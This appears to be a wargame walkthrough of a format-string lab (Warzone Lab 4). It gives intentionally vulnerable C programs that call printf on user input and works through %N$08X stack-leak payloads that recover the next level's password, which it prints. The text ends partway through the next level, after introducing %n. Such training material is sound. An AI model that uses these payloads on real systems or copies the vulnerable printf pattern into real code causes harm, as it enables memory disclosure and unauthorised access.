# Warzone Lab 4: Format Strings

## Lab4C:

```bash
# SSH in
lab4C@<ip>
lab04start
```

```C
/*
 *   Format String Lab - C Problem
 *   gcc -z execstack -z norelro -fno-stack-protector -o lab4C lab4C.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PASS_LEN 30

int main(int argc, char *argv[])
{
    char username[100] = {0};
    char real_pass[PASS_LEN] = {0};
    char in_pass[100] = {0};
    FILE *pass_file = NULL;
    int rsize = 0;

    /* open the password file */
    pass_file = fopen("/home/lab4B/.pass", "r");
    if (pass_file == NULL) {
        fprintf(stderr, "ERROR: failed to open password file\n");
        exit(EXIT_FAILURE);
    }

    /* read the contents of the password file */
    rsize = fread(real_pass, 1, PASS_LEN, pass_file);
    real_pass[strcspn(real_pass, "\n")] = '\0';  // strip \n
    if (rsize != PASS_LEN) {
        fprintf(stderr, "ERROR: failed to read password file\n");
        exit(EXIT_FAILURE);
    }

    /* close the password file */
    fclose(pass_file);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("-----------------------------------------");
    puts("- You must login to access this system. -");
    puts("-----------------------------------------");

    /* read username securely */
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = '\0';    // strip \n

    /* read input password securely */
    printf("--[ Password: ");
    fgets(in_pass, sizeof(in_pass), stdin);
    in_pass[strcspn(in_pass, "\n")] = '\0';      // strip \n

    puts("-----------------------------------------");

    /* log the user in if the password is correct */
    if(!strncmp(real_pass, in_pass, PASS_LEN)){
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
    } else {
        printf(username);
        printf(" does not have access!\n");
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
```

C format strings are vulnerable to injections of format specifiers. Remember we're on x86 architecture so arguments to functions are placed on the stack. Hence if we stick a bunch of format specifiers, this is going to look at the beginning of the stack frame and move up argument by argument. For example:

```C
int n = 5;
printf("%d %d %d %d", n); // All these trailing %d will read stack memory
```

So let's start by injecting a bunch of format specifiers into our username and see if we can print some erroneous stuff!

```
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %d %d %d %d
--[ Password: %d %d %d %d
-----------------------------------------
-1073744462 30 134520840 1680146432 does not have access!
```

Nice! So now we want to inject enough format specifiers to reach the `real_pass` memory. We can print out specific parameters using the `$` specifier. Since we've got a limit on the number of characters we can input this will be pretty handy to reach even further into the stack. Since there's a few buffers allocated on the stack we know we've got a bit of crap to skip over before we hit our password. Specifically, it'll be something like:

```
rsize - 4 bytes
pass_file - 4 bytes
in_pass - 100 bytes
real_pass - 30 bytes
```

Let's putting all A's for our password and then print:

```
lab4C@warzone:/tmp$ /levels/lab04/lab4C
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %0$08X %1$08X %2$08X %3$08X %4$08X %5$08X %6$08X %7$08X
--[ Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------
%0$08X BFFFF592 0000001E 0804A008 41410000 41414141 41414141 41414141 does not have access!
```

Nice! Now we can see exactly where it looks like our `in_pass` buffer is starting, half way through the 4th arg. Let's skip forward about 20 arguments to get over the `in_pass` and into the `real_pass`.

```
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %24$08X %25$08X %26$08X %27$08X %28$08X %29$08X %30$08X %31$08X
--[ Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------
41414141 41414141 41414141 41414141 41414141 75620041 74315F37 7334775F does not have access!
```

Looks like we might be getting the first bit of our password here: `75620041 74315F37 7334775F`. Lets go a little further:

```
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %32$08X %33$08X %34$08X %35$08X %36$08X %37$08X %38$08X %39$08X
--[ Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------
625F376E 33745572 7230665F 62343363 00216531 24323325 20583830 24333325 does not have access!
```

Looks like we've got a nice `\0` byte in here now too, that's probably the end of our string! Putting it all together we have something like:
```
75620041 74315F37 7334775F 625F376E 33745572 7230665F 62343363 00216531
Abu7_1t_w4sn7_brUt3_f0rc34b1e!
```

Dropping off our leftover A we get: `bu7_1t_w4sn7_brUt3_f0rc34b1e!`. 
```
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: user
--[ Password: bu7_1t_w4sn7_brUt3_f0rc34b1e!
-----------------------------------------
Greetings, user!
$ cat /home/lab4B/.pass
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

### What'd we learn:

- You can print specific args with the following syntax: `%<arg_index>$<format_specifier>`.
- You can inject format specifiers to print arbitrary memory.

## Lab4B

```C
/*
 *   Format String Lab - B Problem
 *   gcc -z execstack -z norelro -fno-stack-protector -o lab4B lab4B.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    int i = 0;
    char buf[100];

    /* read user input securely */
    fgets(buf, 100, stdin);

    /* convert string to lowercase */
    for (i = 0; i < strlen(buf); i++)
        if (buf[i] >= 'A' && buf[i] <= 'Z')
            buf[i] = buf[i] ^ 0x20;

    /* print out our nice and new lowercase string */
    printf(buf);

    exit(EXIT_SUCCESS);
    return EXIT_FAILURE;
}
```

Woah nice short one this time, just XORing an input to make alphabet characters lowercase. How the hell are we gonna spawn a shell out of this? Introducing the `%n` format specifier.

The `%n` format specifier is used to know how many bytes have been printed so far. For instance,

```C
unsigned int len = 0;
int n = 5;
printf("Hello World %d%n\n", n, &len);
printf("Last printf had %d bytes\n", len);
```

```
# gcc example.c -o example
# ./example
Hello World 5
Last printf had 13 bytes
```